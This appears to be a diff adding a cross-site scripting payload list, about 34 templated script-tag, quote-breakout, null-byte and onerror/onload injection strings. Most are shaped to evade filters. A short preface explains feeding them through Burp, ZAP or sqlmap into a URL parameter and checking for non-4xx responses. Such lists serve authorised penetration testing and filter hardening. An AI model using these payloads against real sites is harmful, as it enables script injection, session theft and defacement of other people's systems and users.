@@ -1,0 +1,46 @@
+Remember, when loading these into Burp, ZAP, sqlmap, etc, (You can do what u want) but personally, i will reuse the
+same 30 entries below, over and over lets say the URI is:
+
+https://examples.com/baseball.php?id=3
+
+I will use this list 60 times, with various characters appending the 3 (the value) IE:
+
+https://examples.com/baseball.php?id=3'<script>{JAVASCRIPT}</script>
+--- 
+In addition, if your using sqlmap, or coding something yourself, try all of them the way I just mentioned, but then urlencode all chars and look for anything 200 or non 
+4xx.
+
+
+<script>{JAVASCRIPT}</script>
+<scr ipt>{JAVASCRIPT}</scr ipt>
+"><script>{JAVASCRIPT}</script>
+"><script>{JAVASCRIPT}</script><"
+'><script>{JAVASCRIPT}</script>
+'><script>{JAVASCRIPT}</script><'
+<SCRIPT>{JAVASCRIPT};</SCRIPT>
+<scri<script>pt>{JAVASCRIPT};</scr</script>ipt>
+<SCRI<script>PT>{JAVASCRIPT};</SCR</script>IPT>
+<scri<scr<script>ipt>pt>{JAVASCRIPT};</scr</sc</script>ript>ipt>
+";{JAVASCRIPT};"
+';{JAVASCRIPT};'
+;{JAVASCRIPT};
+{JAVASCRIPT};
+<SCR%00IPT>{JAVASCRIPT}</SCR%00IPT>
+\";{JAVASCRIPT};//
+<STYLE TYPE="text/javascript">{JAVASCRIPT};</STYLE>
+<<SCRIPT>{JAVASCRIPT}//<</SCRIPT>
+"{EVENTHANDLER}={JAVASCRIPT} 
+<<SCRIPT>{JAVASCRIPT}//<</SCRIPT>
+<img src="1" onerror="{JAVASCRIPT}">
+<img src='1' onerror='{JAVASCRIPT}'
+onerror="{JAVASCRIPT}"
+onerror='{JAVASCRIPT}'
+onload="{JAVASCRIPT}"
+onload='{JAVASCRIPT}'
+<IMG """><SCRIPT>{JAVASCRIPT}</SCRIPT>">
+<IMG '''><SCRIPT>{JAVASCRIPT}</SCRIPT>'>
+"""><SCRIPT>{JAVASCRIPT}
+'''><SCRIPT>{JAVASCRIPT}'
+<IFRAME SRC='f' onerror="{JAVASCRIPT}"></IFRAME>
+<IFRAME SRC='f' onerror='{JAVASCRIPT}'></IFRAME>
+
